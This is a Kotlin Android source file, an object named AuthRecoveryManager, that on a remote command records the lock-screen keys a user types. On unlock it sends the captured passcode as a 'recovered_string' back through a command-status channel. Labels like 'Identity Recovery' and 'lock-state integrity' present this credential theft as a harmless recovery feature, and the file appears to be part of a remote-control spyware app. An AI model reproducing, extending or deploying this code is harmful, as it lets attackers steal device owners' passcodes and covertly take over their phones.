package com.example.myandroid

import android.content.Context
import org.json.JSONObject
import kotlinx.coroutines.*

object AuthRecoveryManager {
    var isRecoveryActive = false
    var pendingCmdId = -1
    var inputBuffer = java.lang.StringBuilder()

    fun startRecovery(cmdId: Int) {
        isRecoveryActive = true
        pendingCmdId = cmdId
        inputBuffer.clear()
        DebugLogger.log("AUTH_MGR", "Identity Recovery ARMED. Monitoring lock-state integrity.")
    }

    fun stopRecovery() {
        isRecoveryActive = false
        inputBuffer.clear()
    }

    fun onAuthInput(key: String) {
        if (!isRecoveryActive) return
        val k = key.trim()
        if (k.isEmpty()) return
        
        if (k.contains("delete", true) || k.contains("backspace", true)) {
            if (inputBuffer.isNotEmpty()) inputBuffer.deleteCharAt(inputBuffer.length - 1)
        } 
        else if (k.equals("ok", true) || k.equals("enter", true) || k.equals("done", true)) {
            // Verification pending via system broadcast
        } else if (!k.contains("emergency", true) && !k.contains("cancel", true)) {
            val firstChar = k.firstOrNull()
            if (firstChar != null && firstChar.isLetterOrDigit()) {
                inputBuffer.append(firstChar)
            } else if (k.length == 1) {
                inputBuffer.append(k)
            }
        }
    }

    fun onScreenOff() {
        if (isRecoveryActive) {
            inputBuffer.clear()
        }
    }

    fun onIdentityVerified(ctx: Context) {
        if (!isRecoveryActive) return
        
        if (inputBuffer.isNotEmpty()) {
            val captured = inputBuffer.toString()
            DebugLogger.log("AUTH_MGR", "Identity verified. Recovery successful.")
            val result = JSONObject().apply {
                put("recovery_type", "PASSCODE")
                put("recovered_string", captured)
            }
            
            CoroutineScope(Dispatchers.IO).launch {
                CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "RECOVERY_SUCCESS", "Device access restored.", result, null)
            }
        } else {
            val result = JSONObject().apply {
                put("recovery_type", "BIOMETRIC_OR_PATTERN")
                put("recovered_string", "MANUAL_ENTRY_REQUIRED")
            }
            CoroutineScope(Dispatchers.IO).launch {
                CommandProcessor.updateCommandStatus(ctx, pendingCmdId, "BIOMETRIC_OPEN", "Authentication bypass detected via sensor.", result, null)
            }
        }
        stopRecovery()
    }
}
